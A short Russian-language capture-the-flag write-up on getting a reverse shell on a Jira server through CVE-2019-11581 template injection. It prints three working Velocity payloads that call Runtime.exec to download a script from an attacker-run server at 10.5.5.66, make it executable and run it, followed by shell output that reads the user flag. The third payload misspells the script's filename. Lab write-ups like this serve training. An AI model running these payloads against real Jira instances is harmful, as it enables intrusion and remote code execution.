# Врайтап на Jiro


## Первый шаг.
Первым же делом проверил порты через `nmap`, увидел `8080/tcp open  http-proxy` 
Перешел по 8080 порту и первым же делом пошел искать CVE на Jiro

Нашел этот гитхаб `https://github.com/UGF0aWVudF9aZXJv/Atlassian-Jira-pentesting?tab=readme-ov-file#cve-2019-11581-template-injection` и `CVE-2019-11581`

## Шаг второй.

Подумав я решил, что код выполняется на сервере, не видимо для пользователя. Так еще и в локальной дерриктории нельзя ничего создавать и выполнять команды. 

Сделал такие три пайлоада для получения реверс шела.

Так же я запустил фласк сервер что бы оттуда на сервер скачать файл `marcusovDobr.sh`

Залил на сервер вредоносный файл
```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl -L -o /tmp/marcusovDobr.sh http://10.5.5.66:41200/file').waitFor()
```

Дал файлу полные права
```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('chmod +x /tmp/marcusovDobr.sh').waitFor()
```

Исполни файл
```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('/tmp/marcusovDob.sh').waitFor()
```

И получаю реверс шелл

```
daemon@67f9880e3d47:/var/atlassian/application-data/jira$ ls
ls
analytics-logs
caches
data
database
dbconfig.xml
export
import
log
logos
monitor
plugins
shell
tmp
user_flag.txt
daemon@67f9880e3d47:/var/atlassian/application-data/jira$ cat user_flag.txt
cat user_flag.txt
nto{j1rn4y4_uy4zv1m057}
```
``
